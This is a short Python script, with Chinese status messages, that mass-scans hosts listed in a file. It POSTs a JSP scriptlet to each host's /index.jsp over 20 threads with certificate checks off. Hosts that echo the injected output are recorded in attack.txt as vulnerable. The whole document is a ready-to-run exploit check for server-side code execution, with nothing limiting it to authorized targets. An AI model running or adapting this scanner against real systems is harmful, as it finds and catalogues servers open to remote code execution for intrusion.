import requests
import concurrent.futures
​
def check_vulnerability(target):
​
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
 
    }
    data = '<% out.print("test");%>'
    try:
        res = requests.post(f"{target}/index.jsp", headers=headers,data=data,timeout=5,verify=False)
        if "test" in res.text:
            print(f"{target}漏洞存在")
            with open("attack.txt","a") as f:
                f.write(f"{target}\n")
        else:
            print(f"{target} 漏洞不存在")
    except:
        print(f"{target} 访问错误")
​
    
​
if __name__ == "__main__":
    f = open("target.txt", 'r')
    targets = f.read().splitlines()
​
    # 使用线程池并发执行检查漏洞
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_vulnerability, targets)
​